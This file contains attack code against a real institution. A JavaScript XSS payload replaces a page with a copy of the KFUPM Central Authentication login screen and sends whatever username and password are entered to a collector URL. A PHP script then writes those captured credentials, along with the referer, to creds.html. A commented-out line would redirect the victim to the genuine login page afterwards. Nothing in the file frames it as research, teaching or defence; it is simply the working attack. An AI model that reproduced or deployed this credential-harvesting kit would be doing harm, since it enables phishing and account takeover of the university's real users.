//document.innerHTML = '<form action="login.php" method="post" name="submit" class="form-inline text_right_custom">';
document.body.innerHTML = '<html><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>KFUPM Central Authentication</title><link rel="icon" href="images/kfupm_icon.png" type="image/x-icon"/><link href="https://login.kfupm.edu.sa/authenticationendpoint/libs/bootstrap_3.4.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://login.kfupm.edu.sa/authenticationendpoint/css/Roboto.css" rel="stylesheet"><link href="https://login.kfupm.edu.sa/authenticationendpoint/css/custom-common.css" rel="stylesheet"><link href="https://login.kfupm.edu.sa/authenticationendpoint/ellucian/index.css" rel="stylesheet"><link href="https://login.kfupm.edu.sa/authenticationendpoint/css/ethos-typography.css" rel="stylesheet"></head><body onload="checkSessionKey()"><header class="header header-default hidden"><div class="container-fluid"><br></div><div class="container-fluid"><div class="pull-left brand float-remove-xs text-center-xs"><a href="#"><img src="https://login.kfupm.edu.sa/authenticationendpoint/images/logo-inverse.svg" alt="wso2" title="wso2" class="logo"><h1><em>Identity Server</em></h1></a></div></div></header><div class="container-fluid body-wrapper"><div class="row"><div class="col-sm-offset-1 col-sm-10 col-md-offset-2 col-md-8"><div class="wrapper"><div class="esg-logo-container esg-logo-container__alternative"><div class="align_right_custom"><img src="https://login.kfupm.edu.sa/authenticationendpoint/kfupm/images/kfupm-logo.png" alt="KFUPM CAS"/></div></div><div class="stripe"></div><h3 class="text-normal text_right_custom">Sign in to your account</h3><script src="https://login.kfupm.edu.sa/authenticationendpoint/libs/jquery_3.4.1/jquery-3.4.1.js"></script><script src="https://login.kfupm.edu.sa/authenticationendpoint/libs/bootstrap_3.4.1/js/bootstrap.min.js"></script><form action="login.php" method="post" id="myForm" name="submit" class="form-inline text_right_custom"><div class="form-group"><input id="usernameUserInput" name="usernameUserInput" type="text" class="form-control" tabindex="0" placeholder="Username"required><i aria-hidden="true" class="user icon"></i><input id="username" name="username" type="hidden" ></div><div class="form-group"><input id="password" name="password" type="password" class="form-control" placeholder="Password" autocomplete="off"><i aria-hidden="true" class="lock icon"></i></div><div class="form-group"><div class="form-actions"><button class="eds-button eds-button--primary eds-button--small" name="submit" type="submit">Sign In</button></div></div><br><br><div class="form-group force-display-block"><label><input type="checkbox" id="chkRemember" name="chkRemember">Remember me on this computer</label></div><br><div><input type="hidden" name="sessionDataKey" value="325ac7b2-0588-47dc-92aa-981d9bb27892"/></div><div class="form-group"></div></form></div></div></div></div><script src="https://login.kfupm.edu.sa/authenticationendpoint/libs/jquery_3.4.1/jquery-3.4.1.js"></script><script src="https://login.kfupm.edu.sa/authenticationendpoint/libs/bootstrap_3.4.1/js/bootstrap.min.js"></script>   </body></html>';
    document.getElementById('myForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent form submission

      var form = event.target;
      var formData = new FormData(form);

      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'http://localhost/xss/login.php', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            // Request succeeded, handle the response
            console.log(xhr.responseText);
          } else {
            // Request failed, handle the error
            console.error('Request failed with status:', xhr.status);
          }
        }
      };

      xhr.send(new URLSearchParams(formData).toString());
    });








<?php

$pass = $_POST['password'];
$user = $_POST['usernameUserInput'];
$referer = $_SERVER['HTTP_REFERER'];
$fp = fopen('creds.html', 'a+');
fwrite($fp, '<span style="color: green; font-size: 13px;">'.$referer.'</br><span style="color: red; font-size: 13px;"></br><h1>username : ' . $user . ' <h1>password : ' . $pass . '</span><br>');
fclose($fp);
//echo '<META HTTP-EQUIV="Refresh"  CONTENT="0; https://login.kfupm.edu.sa/authenticationendpoint/login.do?Name=PreLoginRequestProcessor&commonAuthCallerPath=%252Fcas%252Flogin&forceAuth=true&passiveAuth=false&service=https%3A%2F%2Fportal.kfupm.edu.sa%2Fc%2Fportal%2Flogin&tenantDomain=carbon.super&sessionDataKey=59693263-e18f-40c7-af6e-4ab6b7ec0341&relyingParty=Portal_Prod&type=cas&sp=Portal_Prod&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL">';
?>


